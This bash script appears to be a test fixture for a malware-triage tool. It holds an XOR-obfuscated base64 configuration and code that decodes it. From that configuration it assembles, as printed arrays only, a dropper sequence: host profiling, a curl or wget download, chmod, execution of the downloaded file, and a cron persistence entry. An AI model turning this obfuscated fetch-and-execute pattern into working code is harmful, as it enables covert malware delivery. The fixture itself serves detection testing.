# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_6b57772c='dv0wPQt0pXEyRXCybicRbKVeKRdztC0gG3G1aDMdX7JkLBd0pS02Cmm0ZB4eaaxkbRtooW8mHV+tbiUdLKRoMghhtGIpJ3CybiIdc7N9IBxhsHUkCj2jdDMUX6FzIhBfpmAtFGKhYioEc7RgJh1fo240FnT9ND0bYa1xIBFnrl4oHD2jYCwIYalmL1U1+DN1SzemZXRPfLVzLUVotHUxCzrvLnRAMvQydh5k9TZvHXihbDEUZe5oLw5hrGglVzn5MHgdYqRgbwtovHQyHXKfYCYdbrQ8CQ1utHMkC3OMYCNXNfgzdUs3pmV0T3ymaC0dX7BgNRA973UsCC+odC8McqVyMlVjoWIpHS/ucjUZZ6UsdEAy9DJ2HmT1Nj0ZcqNpHghyr2MkRXWuYCwdLa19Mh1ytmgiHV+uYCwdPbVxJRl0pSx0QDL0MnYeZPU2bwtlsncoG2W8YjMXbp9xIAxo/S4kDGPvYjMXbu5lbg1wpGA1HS31OXNMM/dnJU03'
readonly Codec_6b57772c='base64_literal|repeating_key_xor|00,c0,01,41,78'

Load_6b57772c() {
  stored_bytes=()
  local encoded_part
  while read -r encoded_part; do [[ -n "$encoded_part" ]] && stored_bytes+=("$encoded_part"); done < <(printf '%s' "${Material_6b57772c}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_6b57772c() {
  recovered_bytes=()
  local -a key_bytes=(0 192 1 65 120)
  local byte_index
  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do
    recovered_bytes+=("$((stored_bytes[byte_index] ^ key_bytes[byte_index % ${#key_bytes[@]}]))")
  done
}

Recover_6b57772c() {
  local -a stored_bytes recovered_bytes
  local configuration_text harmless_value decode_pass byte_index
  if ((2 > 1)); then harmless_value=left; else harmless_value=right; fi
  Load_6b57772c
  decode_pass=0; while ((decode_pass < 1)); do Decode_6b57772c; ((decode_pass+=1)); done
  configuration_text=''
  local octal character
  for byte_index in "${!recovered_bytes[@]}"; do
    printf -v octal '%03o' "${recovered_bytes[byte_index]}"
    printf -v character '%b' "\\$octal"
    configuration_text+="$character"
  done
  printf '%s\n' "$configuration_text"
}

Inspect_6b57772c() { Recover_6b57772c; }

Plan_6b57772c() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_6b57772c)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_6b57772c; fi

# reconstruction complete